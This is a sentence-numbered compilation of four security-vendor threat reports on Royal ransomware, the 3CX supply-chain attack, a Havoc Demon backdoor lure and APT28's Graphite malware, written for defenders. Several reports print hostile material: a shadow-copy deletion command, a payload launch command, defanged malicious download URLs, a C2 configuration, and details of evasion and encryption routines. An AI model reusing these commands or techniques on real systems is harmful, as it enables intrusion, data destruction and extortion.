sentence.5509: title: Conti Team One Splinter Group Resurfaces as Royal Ransomware with Callback Phishing Attacks url: https://www.trendmicro.com/en_us/research/22/l/conti-team-one-splinter-group-resurfaces-as-royal-ransomware-wit.html Conti Team One Splinter Group Resurfaces as Royal Ransomware with Callback Phishing Attacks From September to December, we detected multiple attacks from the Royal ransomware group.
sentence.5510: In this blog entry, we discuss findings from our investigation of this ransomware and the tools that Royal ransomware actors used to carry out their attacks.
sentence.5511: By: Ivan Nicole Chavez, Byron Gelera, Monte de Jesus, Don Ovid Ladores, Khristian Joseph Morales December 21, 2022Read time: ( words) Save to Folio Subscribe Royal ransomware may have been first observed by researchers around September 2022, but it has seasoned cybercriminals behind it: The threat actors running this ransomware — who used to be a part of Conti Team One, according to a mind map shared by Vitali Kremez — initially dubbed it Zeon ransomware, until they rebranded it to Royal ransomware.
sentence.5512: From September to December this year, we have detected multiple attacks from Royal ransomware, with the US and Brazil being the most targeted countries (Figure 1).
sentence.5513: This blog entry discusses in depth the findings from our investigation of samples of this new piece of ransomware, as well as the tools that Royal ransomware actors used to carry out their attacks.
sentence.5515: Percentage of Royal ransomware attacks by country Infection Routine External reports mention that the Royal ransomware group uses callback phishing as a means of delivering their ransomware to victims (Figure 2).
sentence.5516: These phishing attacks contain a number that leads to a service hired by the threat actors.
sentence.5517: When contacted, they will use social engineering tactics to lure victims into installing remote access software. Figure 2.
sentence.5518: Royal ransomware’s attack flow Installation Our investigation found that the ransomware actors used a compiled remote desktop malware, which was used to drop the tools they needed to infiltrate the victim’s system: they used QakBot and Cobalt Strike for lateral movement, while NetScan was used to look for any remote systems connected to the network.
sentence.5519: Once they infiltrated the system, the ransomware actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.
sentence.5520: They then exfiltrate the victim’s data via the RClone tool.
sentence.5521: We also observed an instance in which they used AdFind to look for active directories, then executed RDPEnable on the infected machine.
sentence.5522: Payload Once everything has been set up, the ransomware actors used PsEXEC to execute the malware.
sentence.5523: The PsEXEC commands contain the ID of the victim, along with any argument that the actors applied to the ransomware.
sentence.5524: There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system before executing the ransomware.
sentence.5526: In part of our analysis, we used a ransomware sample with the detection name Ransom.Win64.YORAL.SMYXCJCT.
sentence.5527: As shown in Table 1, Figure 3, and Figure 4, Royal ransomware requires an argument of “-id {32-byte characters}” to execute on a victim’s machine.
sentence.5528: It also accepts “-path” to specify a target file for encryption and “-ep {value}” to calculate the partial file encryption of large files.
sentence.5529: In some earlier samples of the ransomware, the binary wouldn’t parse all the arguments due to a bug in the code.
sentence.5530: For example, “-path” won't be processed if provided after the "-id" argument; if provided before, there will be no "-id" argument, so it will not proceed.
sentence.5531: Argument Description -path {target path} If provided, will only encrypt the contents of the target path -id {32-byte characters} Will be used as the victim’s ID, which will be appended on the TOR link found in the dropped ransom note.
sentence.5532: The process exists if not provided or if provided characters is not 32 bytes long -ep This argument is for the full or partial encryption of file routine Table 1.
sentence.5533: Arguments accepted by the Royal ransomware binary Figure 3.
sentence.5534: Arguments accepted by the ransomware binary Figure 4.
sentence.5535: Checking if length of provided “-id” is 32 bytes It enumerates files and directories for encryption using FindFirstFileW, FindNextFileW, and FindClose APIs (Figure 5).
sentence.5537: File enumeration The ransomware looks for available network shares for network encryption by listing accessible local IPs, then uses NetShareEnum and attempts to connect on ADMIN$ and IPC$ shares (Figure 6).
sentence.5539: Looking for accessible local IPs then trying to connect to ADMIN$ and IPC$ It checks for the number of processors in the infected system and uses it as a base for the concurrent running threads for file encryption, as shown in Figure 7.
sentence.5540: By doing so, Royal ransomware significantly increases the speed of its file encryption process.
sentence.5542: Checking the number of processors Royal ransomware inhibits system recovery by deleting shadow copies (Figure 8) through the following command: C:\\Windows\\System32\\vssadmin.exe delete shadows /all
sentence.5544: Using vssadmin.exe to delete shadow copies The ransomware encrypts files using OpenSSL’s Advanced Encryption Standard (AES).
sentence.5545: It will encrypt the AES key and IV with RSA encryption using the embedded RSA public key (Figure 9).
sentence.5546: The RSA-encrypted AES key and IV will be appended on each encrypted file (Figure 10).
sentence.5549: Generation of AES Key and IV The malicious actors behind Royal ransomware use a form of intermittent encryption tactic to speed their encryption process: the ransomware first checks if the file size is divisible by 16, which is a requirement for AES (Figure 11).
sentence.5550: If not, it rounds up the total size until it is divisible by 16.
sentence.5551: For example, if the size is 18, it will append zero bytes to the file until it has a size of 32, which is now divisible by 16.
sentence.5552: Aside from appending the needed zero bytes, it also appends an extra 0x210 Zero bytes as a placeholder for the appended RSA encrypted key. Figure 11.
sentence.5553: Royal ransomware checking if file size is divisible by 16
sentence.5554: For a file size that has been rounded-up, Royal ransomware will check if the size is less than or equal to 5,245,000 bytes or if the value is set to 100 (0x64), as shown in Figure 12.
sentence.5555: If the file size is within these limits, it will encrypt the entire file.
sentence.5556: For files greater than 5,245,000 bytes, file encryption will take place per certain calculated blocks: for example, it will encrypt first N bytes, then skip the next N bytes, then encrypt the next N bytes, and so on. Figure 12.
sentence.5557: Encryption process and calculation Its calculation of N bytes is as follows: X / 10* (Original file size) & 0xFFFFFFF0 where X is the value set before encryption X is either 0x32 (50) or 0x64 (100)
sentence.5558: This value will also be used as indicator if full encryption or partial encryption will be performed on the file For example, with a file with a file size equal to 5,245,000: N = 50/10 * (5245000 / 100) & 0xFFFFFFF0 = 0x40060 (262240)
sentence.5559: If the calculated N is greater than 1,024,000, it will simply encrypt per 1,024,000 block instead (Figure 13).
sentence.5561: Condition if N is greater than 1,024,000 The encrypted file’s structure would then be as follows (Table 2): Description Size Encrypted File Contents Rounded-up file size divisible by 16 RSA Encrypted Key 0x200 bytes Size of encrypted file / offset address of RSA Encrypted Key 8 bytes
sentence.5562: X value, 0x64 or provided value (usually 0x32), indicator if full or partial encryption 8 bytes Table 2.
sentence.5563: An encrypted file’s structure The ransomware then renames the encrypted files by appending them with the “.royal” extension, as demonstrated in Figures 14 and 15. Figure 14.
sentence.5564: Royal ransomware appending “.royal” to encrypted files Figure 15.
sentence.5565: Encrypted files appended with the “.royal” extension For each directory it traverses, Royal ransomware drops a text file named “README.TXT” that contains the ransom note (Figure 16), as well as an advertisement for its “pentesting services” that the ransomware actors will allegedly provide once the ransom has been paid (Figure 17).
sentence.5568: Contents of "README.TXT" with the sample ID we used appended on the TOR link.
sentence.5569: Security Recommendations Our investigation into Royal ransomware attacks shows how the group employs a mixture of both old and new techniques, which indicates that it is no newcomer to the ransomware scene.
sentence.5570: Their use of callback phishing to lure victims into installing remote desktop malware allows them to infiltrate the victim’s machine with relative ease.
sentence.5571: Their intermittent encryption tactics also hasten their encryption of a victim’s files, with the added benefit of evading detection measures that focus on looking for heavy file IO operations.
sentence.5572: Despite their “late” entry to the scene in September, the group already has ransomed multiple companies, and we expect them to be more active in the upcoming months.
sentence.5573: More details on Royal ransomware’s other capabilities can be found in Trend Micro’s Threat Encyclopedia.
sentence.5574: We highly advise users and organizations to update their systems with the latest patches and apply multi-layered defense mechanisms.
sentence.5575: The emergence and success of the Royal ransomware gang underscore how ransomware actors are finding more innovative ways to repurposing existing tools and tactics as a means of augmenting their attacks.
sentence.5576: End users and enterprises alike can mitigate the risk of infection from new threats like Royal ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network.
sentence.5577: Adhere to the 3-2-1 rule when backing up important files.
sentence.5578: This involves creating three backup copies on two different file formats, with one of the copies stored in a separate location. Patch and update systems regularly.
sentence.5579: It’s important to keep operating systems and applications up to date and maintain patch management protocols that can deter malicious actors from exploiting any software vulnerabilities.
sentence.5580: Companies can also benefit from the use of multilayered detection and response solutions such as Trend Micro Vision One:trade_mark:, which provides powerful XDR capabilities that collect and automatically correlate data across multiple security layers — email, endpoints, servers, cloud workloads, and networks — to prevent attacks via automated protection, while also ensuring that no significant incidents go unnoticed.
sentence.5581: Trend Micro Apex One:trade_mark: also provides next-level automated threat detection and response to protect endpoints against advanced issues, like human-operated ransomware. Indicators of Compromise (IOCs)

sentence.5602: title: Threat Advisory: 3CX Softphone Supply Chain Compromise url: https://blog.talosintelligence.com/3cx-softphone-supply-chain-compromise/ Cisco Talos is tracking and actively responding to a supply chain attack involving the 3CX Desktop Softphone application.
sentence.5603: This is a multi-stage attack that involves sideloading DLLs, seven-day sleep routines, and additional payloads dependent on a now-removed GitHub repository for Windows-based systems.
sentence.5604: MacOS systems used a different infection chain leveraging a hardcoded C2 domain, as opposed to the GitHub repo.
sentence.5605: This is just the latest supply chain attack threatening users, after the SolarWinds incident in 2020 and the REvil ransomware group exploiting Kaseya VSA in 2021.SummaryCisco Talos recently became aware of a supply chain attack affecting Windows and MacOS users of the 3CX software-based phone application.
sentence.5606: This attack leveraged the legitimate update functionality of the 3CX application to deliver a set of malicious payloads to 3CX users.
sentence.5607: The infection chain consists of several stages and involves sideloading DLLs along with a seven-day sleep cycle before the malware attempts to retrieve additional malicious artifacts from a now-removed GitHub repository for the Windows based infection.
sentence.5608: The GitHub repository hosted a series of icon files with encrypted data appended to the end of the files.
sentence.5609: These encrypted strings, once decrypted, contained the C2 domains for additional malicious artifacts.
sentence.5610: The MacOS version used a hard coded C2 domain.
sentence.5611: These second-stage payloads are information stealers that attempt to obtain system information and the latest browsing history records, indicating this information may be used as a filtering mechanism to identify and discard some victims while maintaining unauthorized access to others.
sentence.5612: During our investigation we were able to see file activity dating back to February 3, 2023.
sentence.5613: However, the GitHub repository has been active since December 2022.
sentence.5614: The full scope of the attack is uncertain at this point.
sentence.5615: The 3CX website claims to have over 600,000 customers and 12 million daily users.
sentence.5616: It's unclear how many are users of the 3CX Desktop App versus the web app option that was not affected.
sentence.5617: 3CX is currently asking users to use the web app while they work to release an update.
sentence.5618: Preparing since February 2022Based on Cisco Talos investigation, it appears the infrastructure that supported this attack was being prepared as early as February 2022 when the domains were first registered.
sentence.5619: A second cluster of activity happened toward the end of 2022 when the GitHub repository was created, along with a few other domains.
sentence.5620: The sbmsa[.]wiki domain was also created on Feb. 9, 2023, which was found to be used by the second stage of the MacOS version.
sentence.5621: The timeline below illustrates these clusters of activity.

sentence.5639: title: Malware Disguised as Document from Ukraine's Energoatom Delivers Havoc Demon Backdoor url: https://www.fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor Affected platforms: Microsoft WindowsImpacted parties: Targeted Windows usersImpact: Compromised machines are under the control of the threat actorSeverity level: Medium As part of our ongoing research on malware being used in the Russian-Ukrainian conflict, FortiGuard Labs has encountered a malicious spoofed document pretending to be from the Ukrainian company, Energoatom, a state-owned enterprise that operates Ukraine’s nuclear power plants.
sentence.5640: Since the war with Russia began, Ukraine’s energy sector has been under constant cyberattack.
sentence.5641: For example, in April 2022, an attack deploying INDUSTROYER2 and CADDYWIPER wiper malware targeted energy companies.
sentence.5642: On 16 August 2022, the Energoatom corporate website was the target of a DDoS attack.
sentence.5643: And in October 2022, yet another wiper attack, this one using the wiper dubbed NikoWiper, targeted the energy sector.
sentence.5644: Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise.
sentence.5645: Document Analysis The macro-enabled document is named “zatverdzhenniy_spisok_osib_na_otrim”, which roughly translates to “approved list of persons to receive” in Ukrainian.
sentence.5646: It arrives inside an ISO image archive bearing the same filename.
sentence.5647: It was first submitted to VirusTotal in mid-March of this year.
sentence.5648: When opened, it displays an image instructing the user to enable Word’s macro code execution to reveal information supposedly protected by M.E. Doc (My Electronic Document).
sentence.5649: This popular Ukrainian document management system is used to exchange important and sensitive documents with organizations (including regulatory authorities) in electronic form.
sentence.5650: Blurred content with the logo for Energoatom is displayed behind the instruction, making it appear to be protecting important information (Figure 1).
sentence.5651: In reality, it’s just an ordinary image placed on the top layer of the document.
sentence.5652: Dragging it to the side reveals the supposedly protected information underneath.
sentence.5653: Figure 1: Fake document Once the macro is enabled, the image disappears, creating the impression that the critical information has somehow been revealed.
sentence.5654: The document contains an announcement about a list of people supposedly approved to receive protective equipment (Figure 2).
sentence.5655: Figure 2: Fake document after macro execution VBA Code Analysis To complicate analysis and attempt to evade detection, the macro’s VBA code employs a few interesting techniques.
sentence.5656: The Word application crashes when trying to view or debug the VBA code in the document.
sentence.5657: Similarly, when the document composition is analyzed using oletools (a package of python tools used to analyze Microsoft OLE2 files), the tool produces several errors, including stream files that have been defined but are not present within the archive.
sentence.5658: The tool also reports an error about an incorrect signature when attempting to decompress a specific stream inside the file.
sentence.5659: We have not confirmed if either of these anomalies directly led to the crash above.
sentence.5660: Nevertheless, oletools eventually extracted the complete malicious VBA macro code intended to be executed by the document.
sentence.5661: In a likely attempt to make the location of the macro code less obvious, the VBA Project binary file that contains the actual VBA code is redirected to the file “EbDYTPZ.vEypm” instead of the default “vbaProject.bin”.
sentence.5662: This association is detailed in “word\_rels\ document.xml.rels” of the Office Open XML archive with the following line: “<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="EbDYTPZ.vEypm"/>” As usual, the VBA code is set to execute when the document is opened via AutoOpen and Document_Open events.
sentence.5663: As mentioned, the macro begins by deleting the overlay image, which is internally a Shape object with the Name attribute “happy”.
sentence.5664: To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name.
sentence.5665: To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64.
sentence.5666: In addition, it uses other operations, such as string reverse and character splitting, prior to decoding.
sentence.5667: As an anti-debugging technique, execution of the primary infection routine uses the Application.
sentence.5668: OnTime function commonly used to schedule the execution of a specific VBA procedure instead of directly calling it.
sentence.5669: In this case, it schedules the immediate execution of the function “ostrategicy”.
sentence.5670: When debugging, this line of code produces the error, “Can’t execute code in break mode”, and then stops executing.
sentence.5671: Figure 3 Code with anti-debugging and image deletion As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code.
sentence.5672: This malware then checks if a hardcoded path, “C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll”, exists in the system.
sentence.5673: As discussed later, this is the same file path where the payload would be written.
sentence.5674: This strange implementation detail makes us think this may be a work in progress and could be a test sample created for a threat campaign that will soon be launched.
sentence.5675: The file at the abovementioned path is executed if it exists.
sentence.5676: Otherwise, the code extracts the payload that is cleverly stored as a node named “TwXfx” in a custom XML part of the document.
sentence.5677: Custom XML parts is a feature that was introduced with Office Open XML format.
sentence.5678: It is used for storing arbitrary data that the document could programmatically access.
sentence.5679: To get to the payload data, it starts by enumerating all the custom XML part objects in the document and then checking if they have a node named “TwXfx”.
sentence.5680: That node contains the encoded payload.
sentence.5681: Below is a screenshot of the encoded payload stored in “customXml\item1.xml” of the document archive (Figure 4).
sentence.5682: Figure 4: Encoded binary payload Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction.
sentence.5683: In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes.
sentence.5684: It does this by trying to find the node name, in this case, “TwXfx”, with an appended index, i.e., “TwXfx_0”.
sentence.5685: If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1).
sentence.5686: It repeats this until it fails to find a node, which means it has reached the end of the payload.
sentence.5687: Once a node is found, the content of the node is read, and its XML tags are removed.
sentence.5688: Furthermore, if a string “__b_” is found at the beginning of the data, it is also removed.
sentence.5689: Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35.
sentence.5690: Only this time, the resulting bytes are further decoded with xor 82.
sentence.5691: The decoded payload is a 64-bit executable (.exe).
sentence.5692: The storage of a payload binary as a custom XML part of the document is a technique very similar to what’s presented in this blog from the website mgeeky.tech.
sentence.5693: Even on the code level, there are striking similarities between the code used by the malicious document and what’s presented in that blog.
sentence.5694: The website author offers a private tool that provides similar capabilities.
sentence.5695: Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog.
sentence.5696: Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document.
sentence.5697: Figure 5: Comparison of code in document vs. blog Once the payload is decoded, it is written to the hardcoded path “C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll” and executed using ShellExecute with the following command line:
sentence.5698: C:\Windows\System32\conhost.exe --headless "C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll" "” This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section.
sentence.5699: Payload Analysis Stage 1: OfficeTelemetry.dll Based on the filename of the payload binary, it tries to masquerade as a legitimate component of Microsoft Office.
sentence.5700: It is even signed with an invalid portal.office.com certificate (Figure 6).
sentence.5701: Figure 6: Fake portal.office.com code signing certificate While this file has a DLL extension and contains multiple exports (Figure 7), it is a standalone EXE file.
sentence.5702: Figure 7: Functions exported by OfficeTelemetry.dll Upon execution, it locates a packed and compressed payload in the .vdata section (Figure 8) of the memory allocated for the current process.
sentence.5703: Figure 8: Encrypted and compressed payload in .vdata section
sentence.5704: The payload storage is structured as follows:
sentence.5705: 1. Offset 0x0: Magic (8 bytes) 2. Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption)
sentence.5706: 3. Offset 0x9: Compression flag (0 = not compressed, 3 = LZNT1 compression) 4. Offset 0xa: RC4 key (64 bytes) 5. 0ffset 0x4a:
sentence.5707: Compressed size (4 bytes) 6. Offset 0x4e: Uncompressed size (4 bytes) 7. Offset 0x52: Loader configuration string length (2 bytes) 8. Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9).
sentence.5708: Figure 9: Decrypted and decompressed payload The loader configuration format is as follows: Field 1: Injection type: Current process (1) or in the new process (2) Field 2: Flag to wait for injection thread to terminate before terminating loader (injection type 1 only)
sentence.5709: Field 3: Process to inject into (injection type 2 only)
sentence.5710: Field 4: Process to inject into (injection type 2 only)
sentence.5711: Field 5: Flag to write empty file to %TEMP% upon successful injection Field 6: Wait timeout used for Windows events within the code Field 7: Unknown flag used (injection type 1 only) Field 8: Flag to enable sleep obfuscation after creating an injected thread (injection type 1 only) Field 9: Flag to enable sleep obfuscation via a separate thread Field 10: Flag to enable sleep obfuscation Field 11: Flag to patch APIs After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode.
sentence.5712: The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection.
sentence.5713: It first ensures that a file within the %TEMP% does not exist before attempting to launch the payload.
sentence.5714: The name of this file is derived from a value computed from hour / 3 + year + month + day of the current time.
sentence.5715: Hence, the payload will only be executed up to 8 times per day.
sentence.5716: To launch the shellcode, the loader calls ZwCreateThreadEx to create a new suspended injection thread hidden from debuggers using the THREAD_CREATE_FLAGS_CREATE_SUSPENDED (0x01) and THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (0x4) thread creation flags.
sentence.5717: By removing the THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER flag before the ZwCreateThreadEx call and using memory breakpoints, the shellcode can be debugged in the usual manner when the thread resumes execution.
sentence.5718: While not enabled in this sample, the loader also supports sleep obfuscation to hinder detection by memory scanners.
sentence.5719: It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1. Suspends all threads in the current process
sentence.5721: Reverts the patched Sleep API code bytes 3.
sentence.5722: Reverts patches to security APIs (only if patching was configured) 4. Encodes sensitive memory regions in the current process with a randomized XOR key 5. Calls Sleep with the specified timeout 6.
sentence.5723: Decodes sensitive memory regions in the current process with the same XOR key 7. Patches security-related APIs to disable them 8.
sentence.5724: Patches Sleep to redirect to this function again 9. Resumes all threads in the current process
sentence.5725: The patched APIs are: WldpQueryDynamicCodeTrust in wldp.dll AmsiScanBuffer in amsi.dll EtwEventWrite in ntdll.dll Interestingly, well-known Cobalt Strike configuration field names (Figure 10) are also found in plaintext within the sample, possibly to confuse static analysis tools.
sentence.5726: Figure 10: Cobalt Strike configuration field strings in sample Stage 2: KaynLdr The second stage consists of a shellcode with a Havoc C2 agent DLL appended to it.
sentence.5727: Havoc C2 framework is an open-source post-exploitation toolkit developed by C5pider and comprises the following components: Demon agent: Deployed on infected machines and communicates with configured Teamserver Teamserver: Command & Control (C2) server that manages communications with agents Client: Used by threat actor(s) to connect to a Teamserver for managing and issuing commands to connected agents.
sentence.5728: As the client is not deployed as part of the infection, it will not be discussed further in this article.
sentence.5729: The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ" and “PE” headers of a Windows PE executable file to locate the payload in memory.
sentence.5730: It then calls the loader (referred to internally as KaynLdr in the source code)
sentence.5731: KaynLdr resolves the LdrLoadDll, ZwAllocateVirtualMemory, and NtProtectVirtualMemory Native APIs via API hashing before using them to allocate memory, load the Demon agent payload, and execute it directly from memory.
sentence.5733: LdrLoadDll: 0x9e456a43 NtAllocateVirtualMemory: 0xf783b8ec NtProtectVirtualMemory: 0x50e92888 Stage 3: Havoc Demon agent The DLL loaded by KaynLdr is the Havoc Demon agent, which is analogous to Beacon for the popular Cobalt Strike framework.
sentence.5734: The configuration is embedded within the Demon sample.
sentence.5735: Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests.
sentence.5736: A randomized 256-bit key and 128-bit IV are generated and shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR. Figure 11:
sentence.5737: Check in request data structure The relevant fields in the check-in request are as follows: 1. Size of data package 2. Magic value:
sentence.5739: (hardcoded into Havoc) 3. Agent ID 4. Command ID: 0x63 (DEMON_INITIALIZE) 5. 32-byte AES key 6. 16-byte AES IV 7. AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, "ukrtatnafta[.]org", is specified for this sample.
sentence.5740: This domain is very similar to ukrtatnafta[.]com, owned by Ukrtatnafta, a Ukrainian oil refining company.
sentence.5741: To blend in with legitimate HTTP/HTTPS traffic, Demon randomly picks one of several URIs set in the configuration and applies a specified list of HTTP headers in the requests to the C2.
sentence.5742: The Teamserver C2 configuration extracted from this sample can be seen below.
sentence.5743: Host: ukrtatnafta[.]org:443 HTTPS: True Proxy enabled: No Method: POST Headers:Content-Type: application/javascript Pragma: public ETag: W/736fh0-3e Last-Modified: Mon, 05 Dec 2016 14:54:50 GMT Server: nginx/1.14.2 Connection: keep-alive Expires: Mon, 06 Mar 2023 13:23:47 GMT User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
sentence.5744: Chrome/108.0.0.0 Safari/537.36 URIs:/wp-content/themes/pressa/js/avias.js /wp-content/themes/pressa/js/mobile_menu.js /wp-content/plugins/contact-form-7/includes/js/scripts.js /wp-content/themes/pressa/js/bootstrap.js /wp-content/themes/pressa/js/hovermenu.js /wp-content/themes/pressa/js/retina-1.1.0.js /wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js /wp-content/themes/pressa/js/custom-script.js /wp-includes/js/wp-emoji-release.min.js /maps-api-v3/api/js/52/1/intl/uk_ALL/util.js /wp-includes/js/wp-embed.min.js The major features of Demon include: Enumerate host and network info (users, groups, domains, shares, etc.)
sentence.5745: Execute commands via Command Prompt Execute PowerShell commands Inject and execute DLLs, shellcode, .NET assemblies, Cobalt Strike BOF files Manipulate processes (list, create, search, kill, etc.) Manipulate files and directories (list, download, upload, view, delete, etc.)
sentence.5746: Manipulate access tokens (steal, impersonate, etc.) Take screenshots As this Demon sample was unmodified from the version in Github, we will not analyze it in detail here.
sentence.5747: Interested readers may refer to the documentation and source code on GitHub.
sentence.5748: Conclusion This malware campaign showcases some interesting techniques threat actors use to evade detection and hinder analysis.
sentence.5749: Using a combination of such techniques, threat actors may gain sufficient time to complete their post-exploitation commands upon successful infection before they are detected.
sentence.5750: Although the document contains some indicators of a potential red-team exercise, e.g., the hardcoded path for persisting the payload on disk and use of a relatively novel payload encoding technique, it is also entirely possible that this could be a campaign under development as many red-team tools have been weaponized recently for malicious purposes.
sentence.5751: As this document delivers a backdoor that will silently provide control over the infected user’s system to a remote operator with unknown intentions, it is safer to err on the side of caution and ensure protections are in place.
sentence.5752: The increasing use of open-source offensive security frameworks is a double-edged sword.
sentence.5753: On the one hand, both red and blue teams can benefit from the availability of the source code to better understand how these techniques work, address detection gaps, and improve the cyber resilience of their organizations.
sentence.5754: On the other hand, it enables threat actors to abuse these frameworks to conduct attacks without developing or purchasing custom malware.
sentence.5755: Fortinet Protections FortiGuard AntiVirus detects the malicious files identified in this report as VBA/Havoc.
sentence.5758: FGLTB!tr.bdr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
sentence.5759: The Fortinet AntiVirus engine is a part of each of those solutions.
sentence.5760: As a result, customers who have these products with up-to-date protections are protected.
sentence.5761: This type of threats is usually delivered as email attachments.
sentence.5762: FortiMail can detect and quarantine the malicious attachments for such campaigns.
sentence.5763: Fortinet’s CDR (Content Disarm and Reconstruction) service can neutralize the embedded macros inside the Word document.
sentence.5764: The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them.
sentence.5767: Agent IPS signature to block Havoc C2 network communications.
sentence.5768: Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date.
sentence.5769: We also suggest that organizations have their end users undergo our free NSE training: NSE 1 – Information Security Awareness.

sentence.5774: In the footsteps of the Fancy Bear: PowerPoint mouse-over event abused to deliver Graphite implants url: https://blog.cluster25.duskrise.com/2022/09/23/in-the-footsteps-of-the-fancy-bear-powerpoint-graphite/ By Cluster25 Threat Intel Team September 23, 2022
sentence.5775: Cluster25 researchers collected and analyzed a lure document used to implant a variant of Graphite malware, uniquely linked to the threat actor known as APT28 (aka Fancy Bear, TSAR Team).
sentence.5776: This is a threat group attributed to Russia’s Main Intelligence Directorate of the Russian General Staff by a July 2018 U.S. Department of Justice indictment.
sentence.5777: The lure document is a PowerPoint file that exploits a code execution technique, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
sentence.5778: The code execution runs a PowerShell script that downloads and executes a dropper from OneDrive.
sentence.5779: The latter downloads a payload that extracts and injects in itself a new PE (Portable Executable) file, that the analysis showed to be a variant of a malware family known as Graphite, that uses the Microsoft Graph API and OneDrive for C&C communications.
sentence.5781: According to lure document metadata, attackers used a template potentially linked to The Organisation for Economic Co-operation and Development (OECD).
sentence.5782: This organization works together with governments, policy makers and citizens in order to establish evidence-based international standards and finding solutions to a range of social, economic and environmental challenges.
sentence.5783: This is a PowerPoint file (PPT) containing two slides with the same content, the first one written in English and the second in French.
sentence.5784: The document shows instructions about the use of the Interpretation option available in Zoom.
sentence.5785: Lure document content This PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
sentence.5786: The code that is executed is a PowerShell script shown below, which is run through the utility SyncAppvPublishingServer, and performs the download of a file from OneDrive with a JPEG extension (DSC0002.jpeg).
sentence.5787: This in turn is a DLL file that is later decrypted and written to the local path C:\ProgramData\lmapi2.dll.
sentence.5788: PowerShell Script The full URL used to download the DLL is reported below: URL https[:]\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgugj3FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wmn8_qRmYejLgbNoQmPTUe3P5NKFFLRjeeU_JhvA/DSC0002.jpeg?download
sentence.5789: The execution triggers the setting of the following registry key with the value C:\ProgramData\lmapi2.dll to achieve persistence.

sentence.5794: C:\ProgramData\lmapi2.dll,#1 The DLL file lmapi2.dll is a 64-bit PE file with the compiler timestamp Mon Jan 17 08:10:01 2022 | UTC.
sentence.5795: It creates a new thread, in which a new mutex is created with the name 56rd68kow.
sentence.5796: If the mutex doesn’t already exists, the malware makes another request to OneDrive using the following URL: URL https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qymWyCbPrkKOFgL4CARScSn9UMhq3c5hSNOQsDOamYLmOfN61lUtQO10vxtn0I7QROJdOtQ42wDsaiACGR5ZrmYwt0SmZkphGWQpT2gOFrsUxjg8_7QT01VTABiGr3T6xpWrTmFT5yu4toQ/DSC0001.jpeg?download" A new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from WinCrypt APIs, with a hardcoded public key.
sentence.5797: Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and executes the decrypted content in the newly allocated memory region.
sentence.5798: Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.
sentence.5799: Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.

sentence.5805: The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.]com, i.e. abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.
sentence.5806: Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.
sentence.5807: The malware is known to be deployed in-memory only and served as a downloader for the post-exploitation frameworks like Empire (as documented by Trellix researchers on early 2022 here).

sentence.5810: If a new file is found, the content is downloaded and decrypted through an AES-256-CBCdecryption algorithm.
sentence.5811: The monitoring of task executions and the uploading of their results is managed through a dedicated thread.
